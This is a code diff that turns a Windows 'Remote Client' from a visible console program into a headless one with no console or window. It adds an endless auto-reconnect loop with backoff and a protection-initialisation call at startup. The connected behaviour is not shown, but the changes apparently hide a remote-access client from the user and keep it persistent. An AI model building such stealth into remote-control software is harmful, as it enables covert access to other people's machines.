@@ -855,20 +855,19 @@ static void doDisconnect() {
     g_connected = false;
     g_clientId = 0;
     addLog("[*] Disconnected");
-    ImGui::End();
 }
 
 // ── Main ────────────────────────────────────────────────────────────
 int main() {
-    // ── Console-mode main ───────────────────────────────────────
-    SetConsoleOutputCP(CP_UTF8);
-    SetConsoleTitleA("Remote Client");
+    // ── Pure headless main, no console, no window ─────────────────
+    InitializeProtection();
+    ws::init();
 
     // Use computer name as default client name
     DWORD sz = sizeof(g_nameBuf);
     GetComputerNameA(g_nameBuf, &sz);
 
-    // Allow override via env: CLIENT_HOST, CLIENT_PORT, CLIENT_NAME
+    // Apply env overrides
     if (const char* env = std::getenv("CLIENT_HOST")) {
         strncpy(g_hostBuf, env, sizeof(g_hostBuf) - 1);
         g_hostBuf[sizeof(g_hostBuf) - 1] = 0;
@@ -881,27 +880,28 @@ int main() {
         g_nameBuf[sizeof(g_nameBuf) - 1] = 0;
     }
 
-    printf("=========================================\n");
-    printf("  REMOTE CLIENT (Console Mode)\n");
-    printf("=========================================\n");
-    printf("  Host:   %s\n", g_hostBuf);
-    printf("  Port:   %d\n", g_port);
-    printf("  Name:   %s\n", g_nameBuf);
-    printf("=========================================\n");
-    printf("  (Press Ctrl+C to exit)\n\n");
-
-    InitializeProtection();
-    ws::init();
-
-    // Connect immediately
-    doConnect();
-
-    // Main loop: keep running until interrupted
+    // Auto-reconnect loop with exponential backoff (5s → 60s cap)
+    int retryDelay = 5;
     while (true) {
-        Sleep(delay * 1000);
-        if (delay < 60) delay *= 2;
+        doConnect();
+
+        // While connected, stay alive (10s poll)
+        while (g_connected) {
+            Sleep(10000);
+        }
+
+        // Cleanup and wait before reconnecting
+        if (g_sock != ws::INVALID) {
+            ws::close(g_sock);
+            g_sock = ws::INVALID;
+        }
+        g_connected = false;
+
+        Sleep(retryDelay * 1000);
+        retryDelay = (retryDelay < 60) ? retryDelay * 2 : 60;
     }
-    // Cleanup (unreachable unless signal handler)
+
+    // Unreachable
     ws::shutdown();
     return 0;
 }
